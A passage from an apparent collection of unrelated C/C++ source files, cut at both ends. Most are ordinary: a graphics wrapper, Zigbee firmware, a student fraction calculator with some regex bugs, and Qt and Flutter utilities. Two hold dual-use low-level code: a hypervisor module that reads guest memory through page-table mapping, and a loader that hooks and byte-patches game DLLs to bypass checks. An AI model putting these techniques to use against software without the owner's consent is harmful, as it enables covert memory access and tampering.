sample_clusters.size(); sample++) {\n    size_t cluster = sample_clusters.at(sample);\n    size_t cluster_id = cluster_ids.at(cluster);\n    clusters[cluster_id].push_back(sample);\n  }\n}\n\nunsigned int SamplingOptions::get_samples_per_cluster() const {\n  return num_samples_per_cluster;\n}\n\nconst std::vector<std::vector<size_t>>& SamplingOptions::get_clusters() const {\n  return clusters;\n}\n\n} // namespace grf\n",
    "#include \"GpuCommandList.hpp\"\n\n#include <winrt/base.h>\n\n#include \"ErrorHandling.hpp\"\n#include \"GpuSystem.hpp\"\n#include \"Util.hpp\"\n\nnamespace MotionToGo\n{\n    GpuCommandList::GpuCommandList() noexcept = default;\n\n    GpuCommandList::GpuCommandList(GpuSystem& gpu_system, ID3D12CommandAllocator* cmd_allocator, GpuSystem::CmdQueueType type) : type_(type)\n    {\n        switch (type)\n        {\n        case GpuSystem::CmdQueueType::Compute:\n            TIFHR(gpu_system.NativeDevice()->CreateCommandList(0, D3D12_COMMAND_LIST_TYPE_COMPUTE, cmd_allocator, nullptr,\n                winrt::guid_of<ID3D12GraphicsCommandList>(), cmd_list_.put_void()));\n            break;\n\n        case GpuSystem::CmdQueueType::VideoEncode:\n            TIFHR(gpu_system.NativeDevice()->CreateCommandList(0, D3D12_COMMAND_LIST_TYPE_VIDEO_ENCODE, cmd_allocator, nullptr,\n                winrt::guid_of<ID3D12VideoEncodeCommandList>(), cmd_list_.put_void()));\n            break;\n\n        default:\n            Unreachable();\n        }\n    }\n\n    GpuCommandList::~GpuCommandList() noexcept = default;\n\n    GpuCommandList::GpuCommandList(GpuCommandList&& other) noexcept = default;\n    GpuCommandList& GpuCommandList::operator=(GpuCommandList&& other) noexcept = default;\n\n    GpuSystem::CmdQueueType GpuCommandList::Type() const noexcept\n    {\n        return type_;\n    }\n\n    GpuCommandList::operator bool() const noexcept\n    {\n        return cmd_list_ ? true : false;\n    }\n\n    void GpuCommandList::Transition(std::span<const D3D12_RESOURCE_BARRIER> barriers) const noexcept\n    {\n        switch (type_)\n        {\n        case GpuSystem::CmdQueueType::Compute:\n            static_cast<ID3D12GraphicsCommandList*>(cmd_list_.get())\n                ->ResourceBarrier(static_cast<uint32_t>(barriers.size()), barriers.data());\n            break;\n\n        case GpuSystem::CmdQueueType::VideoEncode:\n            static_cast<ID3D12VideoEncodeCommandList*>(cmd_list_.get())\n                ->ResourceBarrier(static_cast<uint32_t>(barriers.size()), barriers.data());\n            break;\n\n        default:\n            Unreachable();\n        }\n    }\n\n    void GpuCommandList::Close()\n    {\n        switch (type_)\n        {\n        case GpuSystem::CmdQueueType::Compute:\n            static_cast<ID3D12GraphicsCommandList*>(cmd_list_.get())->Close();\n            break;\n\n        case GpuSystem::CmdQueueType::VideoEncode:\n            static_cast<ID3D12VideoEncodeCommandList*>(cmd_list_.get())->Close();\n            break;\n\n        default:\n            Unreachable();\n        }\n    }\n\n    void GpuCommandList::Reset(ID3D12CommandAllocator* cmd_allocator)\n    {\n        switch (type_)\n        {\n        case GpuSystem::CmdQueueType::Compute:\n            static_cast<ID3D12GraphicsCommandList*>(cmd_list_.get())->Reset(cmd_allocator, nullptr);\n            break;\n\n        case GpuSystem::CmdQueueType::VideoEncode:\n            static_cast<ID3D12VideoEncodeCommandList*>(cmd_list_.get())->Reset(cmd_allocator);\n            break;\n\n        default:\n            Unreachable();\n        }\n    }\n} // namespace MotionToGo\n",
    "//#include <Arduino.h>\r\n#include \"esp_log.h\"\r\n#include \"zb_zcl.h\"\r\n#include \"zb_device.h\"\r\n\r\n#define TAG \"zb_device\"\r\n\r\nZbRuntime *g_runtime;\r\n\r\nvoid ZbDevice::leave(void)\r\n{\r\n  //ESP_LOGI(TAG, \"ZbDevice::leave(void)\");\r\n  assert(g_runtime);\r\n  g_runtime->leave();\r\n}\r\n\r\nvoid ZbDevice::reportNow(void)\r\n{\r\n  ESP_LOGI(TAG, \"ZbDevice::reportNow(void)\");\r\n  //if(reportNowFunc) reportNowFunc();\r\n}\r\n\r\nvoid ZbDevice::appendMandatories(void)\r\n{\r\n  initZclData();\r\n  //dumpClusterInfos();\r\n  \r\n  zb_cluster_info_t *ci;\r\n  for(int iEndpoint=0; iEndpoint < getEndpointCount(); iEndpoint++) {\r\n    ZbEndpoint *ep = getEndpoint(iEndpoint);\r\n    assert(ep);\r\n    //ESP_LOGI(TAG, \"Endpoint %02X\", ep->getId());\r\n    for(int iCluster=0; iCluster < ep->getClusterCount(); iCluster++) {\r\n      ZbCluster *cluster = ep->getCluster(iCluster);\r\n      assert(cluster);\r\n      //ESP_LOGI(TAG, \"cluster %04X\", cluster->getId());\r\n      zb_cluster_info_t *ci = findClusterInfo(cluster->getId());\r\n      //ESP_LOGI(TAG, \"ci %04X\", ci);\r\n      if(ci) {\r\n        for(int iAttribute=0; iAttribute < ci->attrCount; iAttribute++) {\r\n          zb_attr_info_t *ai = &ci->attrs[iAttribute];\r\n          if(ai->mandatory && !cluster->findAttribute(ai->attrId)) {\r\n            //ESP_LOGI(TAG, \"Append clusterId=%04X, attrId=%04X, attrAccess=%02X\", ci->clusterId, ai->attrId, ai->attrAccess);\r\n            ZbAttribute *attr = new ZbAttribute(*cluster, ai->attrId, ai->attrType, ai->attrAccess, ai->defaultValue);\r\n          }\r\n        }\r\n      } \r\n    }\r\n  } \r\n  //ESP_LOGI(TAG, \"exit appendMandatories()\"); \r\n}\r\n\r\nZbEndpoint* ZbDevice::findEndpoint(uint8_t id) {\r\n  for(int iEndpoint=0; iEndpoint < m_endpointCount; iEndpoint++) {\r\n    if(m_endpoints[iEndpoint]->getId() == id) \r\n      return m_endpoints[iEndpoint];\r\n  }\r\n  return NULL;\r\n}\r\n\r\nZbCluster* ZbEndpoint::findCluster(uint16_t id) {\r\n  for(int iCluster=0; iCluster < m_clusterCount; iCluster++) {\r\n    if(m_clusters[iCluster]->getId() == id) \r\n      return m_clusters[iCluster];\r\n  }\r\n  return NULL;\r\n}\r\n\r\nZbAttribute* ZbCluster::findAttribute(uint16_t id) {\r\n  for(int iAttribute=0; iAttribute < m_attrCount; iAttribute++) {\r\n    if(m_attributes[iAttribute]->getId() == id) \r\n      return m_attributes[iAttribute];\r\n  }\r\n  return NULL;\r\n}\r\n\r\nvoid ZbAttribute::report(void)\r\n{\r\n  if(getDevice()->joined()) {\r\n    assert(g_runtime);\r\n    esp_zb_zcl_status_t state_tmp = (esp_zb_zcl_status_t) g_runtime->reportAttribute(getEndpoint()->getId(), getCluster()->getId(), m_id);\r\n  }\r\n}\r\n\r\nvoid ZbAttribute::updateValue(void)\r\n{\r\n  //ESP_LOGI(TAG, \"ZbAttribute::updateValue(void)\");\r\n  // !!! \u043f\u0438\u0441\u0430\u0442\u044c \u0432 \u0430\u0442\u0440\u0438\u0431\u0443\u0442 \u043d\u0435 \u0442\u043e\u043b\u044c\u043a\u043e \u043f\u0440\u0438 \u0441\u043e\u0435\u0434\u0438\u043d\u0435\u043d\u0438\u0438, \u0430 \u0432 \u043b\u044e\u0431\u043e\u043c \u0441\u043b\u0443\u0447\u0430\u0435 \u043f\u043e\u0441\u043b\u0435 \u0441\u043e\u0437\u0434\u0430\u043d\u0438\u044f \u0430\u0442\u0440\u0438\u0431\u0443\u0442\u043e\u0432 \u0447\u0435\u0440\u0435\u0437 SDK\r\n  if(getDevice()->joined()) {  \r\n    assert(g_runtime);\r\n    ESP_LOGI(TAG, \"g_runtime->setAttributeValue endpoint=%d clusterId=0x%04X attrId=0x%04X: 0x%02X\", getEndpoint()->getId(), getCluster()->getId(), m_id, *m_data);\r\n    esp_zb_zcl_status_t err = (esp_zb_zcl_status_t) g_runtime->setAttributeValue(getEndpoint()->getId(), getCluster()->getId(), getCluster()->getRole(), m_id, m_data, false);\r\n    if(err != ESP_ZB_ZCL_STATUS_SUCCESS)\r\n      ESP_LOGE(TAG, \"Setting attribute failed (%04X)!\", err);\r\n    else \r\n      ESP_LOGI(TAG, \"Setting attribute success.\");\r\n  }\r\n}\r\n\r\nvoid ZbAttribute::setValue(int32_t value)\r\n{\r\n//  ESP_LOGI(TAG, \"ZbAttribute::setValue(uint8_t value)\");\r\n  if (m_data && m_dataOwned) free(m_data);\r\n  m_intData = (uint32_t) value;\r\n  m_data = (uint8_t *) &m_intData;\r\n  m_dataOwned = false;\r\n  updateValue();\r\n}\r\n\r\nvoid ZbAttribute::setValue(uint32_t value)\r\n{\r\n//  ESP_LOGI(TAG, \"ZbAttribute::setValue(uint8_t value)\");\r\n  if (m_data && m_dataOwned) free(m_data);\r\n  m_intData = value;\r\n  m_data = (uint8_t *) &m_intData;\r\n  m_dataOwned = false;\r\n  updateValue();\r\n}\r\n\r\nvoid ZbAttribute::setValue(float value)\r\n{\r\n  //ESP_LOGI(TAG, \"ZbAttribute::setValue(float value)\");\r\n  if (m_data && m_dataOwned) free(m_data);\r\n  m_floatData = value;\r\n  m_data = (uint8_t *) &m_floatData;\r\n  m_dataOwned = false;\r\n  updateValue();\r\n}\r\n\r\nvoid ZbAttribute::setValue(char* value)\r\n{\r\n  //ESP_LOGI(TAG, \"ZbAttribute::setValue(char* value)\");\r\n  if (m_data && m_dataOwned) free(m_data);\r\n  if(m_type == ESP_ZB_ZCL_ATTR_TYPE_CHAR_STRING || m_type == ESP_ZB_ZCL_ATTR_TYPE_OCTET_STRING) { // \u0434\u043e\u043f\u043e\u043b\u043d\u0438\u0442\u044c!!!\r\n    int len = strlen(value);\r\n    m_data = (uint8_t *) malloc(len + 1);\r\n    m_data[0] = len;\r\n    memcpy(m_data + 1, value, len);\r\n    m_dataOwned = true;\r\n  }\r\n  else {\r\n    m_data = (uint8_t *) value;\r\n    m_dataOwned = false;\r\n  }\r\n  updateValue();\r\n}\r\n",
    "////program name : FCAI-Cairo University Fraction Calculator\n// Program Description: Calculator that is able to add, subtract, multiply and divide fractions\n\n// Author1 and ID and Group: Youssef Amgad Abd Al Halim Ahmed, Testing and regex pattern\n\n// Author2 and ID and Group: Mohamed Ahmed Mohamed Abd El_wahab, Mathematical Calculations\n\n// Author3 and ID and Group: Amr Khaled Ahmed Abd ElHamid, divided the regex pattern into three parts(operator, fraction 1 , fraction 2), created if statement for the mathematical calculations\n\n\n#include <iostream>\n#include <regex>\n# include <cctype>\n# include <string>\n# include <cstring>\n# include <algorithm>\n# include <vector>\n\nusing namespace std;\n\nbool is_valid(string format);\nstring operation(string equation);\npair<long long, long long> extract_fraction(string temp_fraction);\nstring addition_fraction(long long num_fraction1,long long deno_fraction1,long long num_fraction2,long long deno_fraction2);\nstring subtraction_fraction(long long num_fraction1,long long deno_fraction1,long long num_fraction2,long long deno_fraction2);\nstring multiplcation_fraction(long long num_fraction1,long long deno_fraction1,long long num_fraction2,long long deno_fraction2);\nstring division_fraction(long long num_fraction1,long long deno_fraction1,long long num_fraction2,long long deno_fraction2);\npair<long long,long long> common_divisor(long long numerator,long long denominator);\n\n\nint main() {\n\n    cout << \"Welcome to our fractional calculator\" << endl;\n\n    while(true){\n        string format;\n        string choice;\n\n        // display menu and take input from user and take choice from user\n        cout << \"1. Enter an input\" << endl;\n        cout << \"2. Exit\" << endl;\n        cout << \"Choose 1 or 2\" << endl;\n        cin >> choice;\n\n        // validate choice\n        while (true) {\n            if (choice == \"1\")break;\n            else if (choice == \"2\") {\n                cout << \"Thanks for using our fractional calculator\" << endl;\n                return 0;\n            } else {\n                cout << \"Invalid input, please enter a valid choice\" << endl;\n                cin >> choice;\n            }\n        }\n\n        // get calculation from user\n        cin.ignore();\n        cout << \"Please enter your calculation\" << endl;\n        getline(cin, format);\n\n        // make sure format isn't empty\n        while (format.empty()) {\n            cout << \"Invalid input\" << endl;\n            cout << \"Enter a valid input format\" << endl;\n            getline(cin, format);\n        }\n\n        // make sure format matches calculation format\n        bool is_valid_format = is_valid(format);\n\n        while (!is_valid_format) {\n            cout << \"Invalid input\" << endl;\n            cout << \"Enter a valid input format\"<<endl;;\n            getline(cin, format);\n            is_valid_format = is_valid(format);\n        }\n        operation(format);\n    }\n\n}\n\n\nstring operation(string equation) {\n    double result_D;\n    regex N(\"-\");\n    regex Multi(\"\\\\\"); // Escaping '' since it's a special character in regex\n    regex Divide (\"/\");\n    smatch matches;\n\n    // here I will define the equation form divided into parts then take every part as (fraction_1, operation, fraction_2) the perform the equation\n    regex equation_form(\"[ ]?([+-]?[0-9]+(?:/[0]?+[1-9][0-9])?)\\\\s([-+/])\\\\s([+-]?[0-9]+(?:/[0]?+[1-9][0-9])?)[ ]*?\");\n    regex_match(equation, matches, equation_form);\n    string fraction_1 = matches[1].str();\n    string operation = matches[2].str();\n    string fraction_2 = matches[3].str();\n    // by operation choose the operation\n\n    pair<long long, long long> fraction = extract_fraction(fraction_1);\n    pair<long long, long long> fraction2 = extract_fraction(fraction_2);\n\n    if (operation == \"+\"){\n        cout << \"Addition\" << endl;\n        addition_fraction(fraction.first,fraction.second,fraction2.first,fraction2.second);\n\n    }\n    else if (operation == \"-\"){\n        cout << \"Subtraction\" << endl;\n        subtraction_fraction(fraction.first,fraction.second,fraction2.first,fraction2.second);\n\n    }\n    else if (operation == \"/\"){\n        cout << \"Divide\" << endl;\n        division_fraction(fraction.first,fraction.second,fraction2.first,fraction2.second);\n\n    }\n    else if (operation == \"*\"){\n        cout << \"multiplies\" << endl;\n        multiplcation_fraction(fraction.first,fraction.second,fraction2.first,fraction2.second);\n\n    }\n\n    // Return some value since the function is declared to return a string\n    return \"Operation performed successfully\";\n}\n\n\n// function that checks if the format the user entered is correct and valid\nbool is_valid(string format) {\n    if (regex_match(format, regex(\"[ ]?[+-]?[0-9]+(?:/[0]?+[1-9][0-9])?\\\\s[-/+]\\\\s[+-]?[0-9]+(?:/[0]?+[1-9][0-9])?[ ]*?\"))) {\n        return true;\n    } else {\n        return false;\n    }\n}\n\n\npair<long long, long long> extract_fraction(string temp_fraction) {\n    long long sign = 1;\n    string fraction = temp_fraction;\n    if (fraction[0] == '-') {\n        ",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include \"mm.hpp\"\n\nnamespace mm\n{\n    auto translate(virt_addr_t virt_addr) -> u64\n    {\n        virt_addr_t cursor{ (u64) vmxroot_pml4 };\n        if (!reinterpret_cast<ppml4e>(cursor.value)[virt_addr.pml4_index].present)\n            return {};\n\n        cursor.pt_index = virt_addr.pml4_index;\n        if (!reinterpret_cast<ppdpte>(cursor.value)[virt_addr.pdpt_index].present)\n            return {};\n\n        // handle 1gb large page...\n        if (reinterpret_cast<ppdpte>(cursor.value)[virt_addr.pdpt_index].page_size)\n            return (reinterpret_cast<ppdpte>(cursor.value)\n                [virt_addr.pdpt_index].pfn << 12) + virt_addr.offset_1gb;\n\n        cursor.pd_index = virt_addr.pml4_index;\n        cursor.pt_index = virt_addr.pdpt_index;\n        if (!reinterpret_cast<ppde>(cursor.value)[virt_addr.pd_index].present)\n            return {};\n\n        // handle 2mb large page...\n        if (reinterpret_cast<ppde>(cursor.value)[virt_addr.pd_index].page_size)\n            return (reinterpret_cast<ppde>(cursor.value)\n                [virt_addr.pd_index].pfn << 12) + virt_addr.offset_2mb;\n\n        cursor.pdpt_index = virt_addr.pml4_index;\n        cursor.pd_index = virt_addr.pdpt_index;\n        cursor.pt_index = virt_addr.pd_index;\n        if (!reinterpret_cast<ppte>(cursor.value)[virt_addr.pt_index].present)\n            return {};\n\n        return (reinterpret_cast<ppte>(cursor.value)\n            [virt_addr.pt_index].pfn << 12) + virt_addr.offset_4kb;\n    }\n\n    auto translate(virt_addr_t virt_addr, u64 pml4_phys, map_type type) -> u64\n    {\n        const auto pml4 = \n            reinterpret_cast<ppml4e>(\n                map_page(pml4_phys, type));\n\n        if (!pml4[virt_addr.pml4_index].present)\n            return {};\n\n        const auto pdpt =\n            reinterpret_cast<ppdpte>(\n                map_page(pml4[virt_addr\n                    .pml4_index].pfn << 12, type));\n\n        if (!pdpt[virt_addr.pdpt_index].present)\n            return {};\n\n        if (pdpt[virt_addr.pdpt_index].page_size)\n            return (pdpt[virt_addr.pdpt_index].pfn << 12) + virt_addr.offset_1gb;\n\n        const auto pd = \n            reinterpret_cast<ppde>(\n                map_page(pdpt[virt_addr\n                    .pdpt_index].pfn << 12, type));\n\n        if (!pd[virt_addr.pd_index].present)\n            return {};\n\n        if (pd[virt_addr.pd_index].page_size)\n            return (pd[virt_addr.pd_index].pfn << 12) + virt_addr.offset_2mb;\n\n        const auto pt = \n            reinterpret_cast<ppte>(\n                map_page(pd[virt_addr\n                    .pd_index].pfn << 12, type));\n\n        if (!pt[virt_addr.pt_index].present)\n            return {};\n\n        return (pt[virt_addr.pt_index].pfn << 12) + virt_addr.offset_4kb;\n    }\n\n    auto map_page(u64 phys_addr, map_type type) -> u64\n    {\n        cpuid_eax_01 cpuid_value;\n        virt_addr_t result{ (u64) vmxroot_pml4 };\n        __cpuid((int*)&cpuid_value, 1);\n\n        result.pt_index = (cpuid_value\n            .cpuid_additional_information\n                .initial_apic_id * 2)\n                + (unsigned)type;\n\n        reinterpret_cast<ppte>(vmxroot_pml4)\n            [result.pt_index].pfn = phys_addr >> 12;\n\n        __invlpg((void*)result.value);\n        result.offset_4kb = phys_addr_t{ phys_addr }.offset_4kb;\n        return result.value;\n    }\n\n    auto map_virt(u64 dirbase, u64 virt_addr, map_type map_type) -> u64\n    {\n        const auto phys_addr = \n            translate(virt_addr_t{ virt_addr }, \n                dirbase, map_type);\n\n        if (!phys_addr)\n            return {};\n\n        return map_page(phys_addr, map_type);\n    }\n\n    auto read_phys(u64 dirbase, u64 guest_phys, u64 guest_virt, u64 size) -> bool\n    {\n        // handle reading over page boundaries\n        // of both src and dest...\n        while (size)\n        {\n            auto dest_current_size = PAGE_SIZE -\n                virt_addr_t{ guest_virt }.offset_4kb;\n\n            if (size < dest_current_size)\n                dest_current_size = size;\n\n            auto src_current_size = PAGE_SIZE -\n                phys_addr_t{ guest_phys }.offset_4kb;\n\n            if (size < src_current_size)\n                src_current_size = size;\n\n            auto current_size =\n                min(dest_current_size, src_current_size);\n\n            const auto mapped_dest =\n                reinterpret_cast<void*>(\n                    map_virt(dirbase, guest_virt, map_type::dest));\n\n            if (!mapped_dest)\n                return false;\n\n            const auto mapped_src =\n                reinterpret_cast<void*>(\n                    map_page(guest_phys, map_type::src));\n\n            if (!mapped_src)\n                return false;\n\n            __try { memcpy(mapped_dest, mapped_src, current_size); }\n            __except (EXCEPTION_EXECUTE_HANDLER) { return false; }\n\n            guest_phys += current_size;\n            guest_virt += current_size;\n            size -= current_size;\n        }\n        return true;\n    }\n\n    auto w",
    "#include \"silver-bun.h\"\n#include \"ntldr.h\"\n#include \"MinHook.h\"\n#include \"cstdio\"\n#include \"patches.h\"\n#include \"ntstatus.h\"\n\nvoid(__thiscall* oUpdateAreaBits)(void* this_, void* pl, void* a);\n\nvoid __fastcall UpdateAreaBits_not_reckless(void* this_, void* edx, void* player, void* areabits) {\n\tif (!player) {\n\t\tprintf(\"null player in UpdateAreaBits\\n\");\n\t\treturn;\n\t}\n\treturn oUpdateAreaBits(this_, player, areabits);\n}\n\nstd::map<std::string, std::set<uintptr_t>> hooked_functions;\n\nmempatch_table_t patches = {\n\t{\n\t\t\"engine.dll\",\n\t\t\t{\n\t\t\t\t{ \"51 8B 44 24 ? 8B 4C 24 ? 50\", {0x31,0xC0,0xC3} }, // xor eax, eax ret\n\t\t\t\t{ \"E8 ? ? ? ? 8B 4C 24 ? 51 57 8B CE E8 ? ? ? ? 5F 5E C2 ? ? CC\", {0x90,0x90,0x90,0x90,0x90} }, // nop call\n\t\t\t\t{ \"81 EC ? ? ? ? 89 4C 24 ? 8B 0D\", {0xC2,0x04,0x00} }, // ret 4\n\t\t\t\t{ \"8B 06 68 ? ? ? ? EB\", {0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90}}, // lan only mode my ass\n\t\t\t\t{ \"81 EC ? ? ? ? 53 55 8B D9 8B 03\", {0xC2, 0x08, 0x00} }, // save restore? short answer\n\t\t\t\t{ \"56 8B F1 8B 0D ? ? ? ? 8B 01 8B 90 ? ? ? ? FF D2 8D 4E\", {0xC3} }, // save restore? long answer\n\t\t\t},\n\t},\n\t{\n\t\t\"materialsystem.dll\",\n\t\t\t{\n\t\t\t\t{ \"81 EC ? ? ? ? 53 8B 9C 24 ? ? ? ? 56 57 BF\", {0xC2,0x04,0x00} }, // ret 4\n\t\t\t\t{ \"83 EC ? 53 55 56 57 8B F9\", {0xC3} } // ret\n\t\t\t}\n\t},\n\t{\n\t\t\"server.dll\",\n\t\t\t{\n\t\t\t\t{\"80 78 ? ? 75 ? 68 ? ? ? ? E8\", {0x90,0x90,0x90,0x90,0x90,0x90} }, // gamerules\n\t\t\t}\n\t}\n};\n\ndetour_table_t detours = {\n\t{\n\t\t\"server.dll\",\n\t\t{\n\t\t\t{0x1D9DB0 , &UpdateAreaBits_not_reckless, (void**)&oUpdateAreaBits}\n\t\t}\n\t}\n};\n\nvoid LoadCallback(const char* str, void* module_base) {\n\n\tfor (auto& kv_pair : patches) {\n\t\tif (kv_pair.first == str) {\n\t\t\tprintf(\"patching %s\\n\", str);\n\t\t\t// patch module\n\t\t\tCModule mod((uintptr_t)module_base);\n\t\t\tfor (auto& patch_pair : kv_pair.second) {\n\t\t\t\tCMemory mem = mod.FindPatternSIMD(patch_pair.first.c_str());\n\t\t\t\tif (!mem) {\n\t\t\t\t\tprintf(\"Failed mempatching %s! Patched already?\\n\", kv_pair.first.c_str());\n\t\t\t\t\tcontinue;\n\t\t\t\t}\n\t\t\t\tmem.Patch(patch_pair.second);\n\t\t\t}\n\t\t}\n\t}\n\n\tfor (auto& kv_pair : detours) {\n\t\tif (kv_pair.first == str) {\n\t\t\tfor (auto& detour : kv_pair.second) {\n\n\t\t\t\tif (hooked_functions.contains(kv_pair.first) && hooked_functions[kv_pair.first].contains(detour.fn)) {\n\t\t\t\t\tcontinue;\n\t\t\t\t}\n\n\t\t\t\tchar* mbase = (char*)module_base;\n\t\t\t\tif (MH_CreateHook(mbase + detour.fn, detour.detour, detour.trampoline) == MH_OK && MH_EnableHook(mbase + detour.fn) == MH_OK) {\n\t\t\t\t\tprintf(\"detoured %p successfully!\\n\", mbase + detour.fn);\n\t\t\t\t\tif (!hooked_functions.contains(kv_pair.first)) {\n\t\t\t\t\t\thooked_functions[kv_pair.first] = {};\n\t\t\t\t\t}\n\t\t\t\t\thooked_functions[kv_pair.first].insert(detour.fn);\n\t\t\t\t}\n\t\t\t\telse {\n\t\t\t\t\tprintf(\"couldn't detour %p!\\n\", mbase + detour.fn);\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t}\n\n}\n\nvoid UnloadCallback(const char* str, void* module_base) {\n\tif (hooked_functions.contains(str)) {\n\t\tfor (auto& fn : hooked_functions[str]) {\n\t\t\tchar* base = (char*)module_base;\n\t\t\tMH_RemoveHook(base + fn);\n\t\t}\n\t}\n}\n\nvoid __stdcall MyLdrDllNotification( ULONG NotificationReason, PLDR_DLL_NOTIFICATION_DATA NotificationData, PVOID Context) {\n\tchar dllname[MAX_PATH];\n\tsize_t ms_forced_me_to_create_this_variable;\n\n\tif (NotificationReason == LDR_DLL_NOTIFICATION_REASON_LOADED) {\n\t\twcstombs_s(&ms_forced_me_to_create_this_variable, dllname, NotificationData->Loaded.BaseDllName->Buffer, MAX_PATH);\n\t\tLoadCallback(dllname, NotificationData->Loaded.DllBase);\n\t}\n\n\tif (NotificationReason == LDR_DLL_NOTIFICATION_REASON_UNLOADED) {\n\t\twcstombs_s(&ms_forced_me_to_create_this_variable, dllname, NotificationData->Unloaded.BaseDllName->Buffer, MAX_PATH);\n\t\tUnloadCallback(dllname, NotificationData->Unloaded.DllBase);\n\t}\n}\n\nPVOID cookie;\n\nvoid PatchesInit() {\n\tMH_Initialize();\n\n\t_LdrRegisterDllNotification LdrRegisterDllNotification = (_LdrRegisterDllNotification)GetProcAddress(GetModuleHandle(\"ntdll.dll\"), \"LdrRegisterDllNotification\");\n\n\tif (LdrRegisterDllNotification(0, MyLdrDllNotification, NULL, &cookie) != STATUS_SUCCESS) {\n\t\tprintf(\"NTSTATUS != STATUS_SUCCESS!\\n\");\n\t}\n}",
    "#include \"file.hpp\"\n#include <QMimeDatabase>\n\nnamespace {\nconst QMimeDatabase MIME_DATABASE = QMimeDatabase();\n};\n\nvoid File::setPath(QString path) {\n  FilesystemEntry::setPath(path);\n  this->reload();\n}\n\nbool File::opened() const { return this->mOpened; }\nvoid File::setOpened(bool opened) {\n  this->mOpened = opened;\n  emit this->openedChanged();\n}\n\nbool File::autoFlush() const { return this->mAutoFlush; }\nvoid File::setAutoFlush(bool autoFlush) {\n  this->mAutoFlush = autoFlush;\n  emit this->autoFlushChanged();\n}\n\nbool File::readable() const { return this->mReadable; }\nvoid File::setReadable(bool readable) {\n  this->mReadable = readable;\n  emit this->readableChanged();\n}\n\nbool File::writable() const { return this->mWritable; }\nvoid File::setWritable(bool writable) {\n  this->mWritable = writable;\n  emit this->writableChanged();\n}\n\nbool File::shouldAppend() const { return this->mShouldAppend; }\nvoid File::setShouldAppend(bool shouldAppend) {\n  this->mShouldAppend = shouldAppend;\n  emit this->shouldAppendChanged();\n}\n\nbool File::shouldTruncate() const { return this->mShouldTruncate; }\nvoid File::setShouldTruncate(bool shouldTruncate) {\n  this->mShouldTruncate = shouldTruncate;\n  emit this->shouldTruncateChanged();\n}\n\nbool File::binary() const { return this->mBinary; }\nvoid File::setBinary(bool binary) {\n  this->mBinary = binary;\n  emit this->binaryChanged();\n}\n\n// TODO: fs needs to be watched in order to do emits for mimetype updates\nQString File::mimeType() const {\n  return MIME_DATABASE.mimeTypeForFile(this->path()).name();\n}\n\nQString File::mimeTypeIconName() const {\n  return MIME_DATABASE.mimeTypeForFile(this->path()).iconName();\n}\n\nvoid File::open() {\n  this->mOpened = true;\n  this->reload();\n}\n\nvoid File::close() {\n  this->mOpened = false;\n  this->mFile.close();\n}\n\nQString File::read() { return this->mFile.readAll(); }\n\nvoid File::write(const QString &contents) {\n  this->mFile.seek(0);\n  this->mFile.write(qPrintable(contents));\n  this->mFile.resize(this->mFile.pos());\n  if (this->mAutoFlush) {\n    this->mFile.flush();\n  }\n}\n\nvoid File::append(const QString &contents) {\n  this->mFile.seek(this->mFile.size());\n  this->mFile.write(qPrintable(contents));\n  if (this->mAutoFlush) {\n    this->mFile.flush();\n  }\n}\n\nvoid File::reload() {\n  this->mFile.close();\n  this->mFile.setFileName(this->path());\n  if (!this->mOpened || this->path().isEmpty()) {\n    return;\n  }\n  auto flags = QFlags(QIODevice::NotOpen);\n  if (this->mReadable)\n    flags |= QIODevice::ReadOnly;\n  if (this->mWritable)\n    flags |= QIODevice::WriteOnly;\n  if (this->mShouldAppend)\n    flags |= QIODevice::Append;\n  if (this->mShouldTruncate)\n    flags |= QIODevice::Truncate;\n  if (!this->mBinary)\n    flags |= QIODevice::Text;\n  if (flags == QIODevice::NotOpen) {\n    return;\n  }\n  // NOTE: `NewOnly` and `ExistingOnly` omitted as they are not needed for now.\n  this->mFile.open(flags);\n}\n",
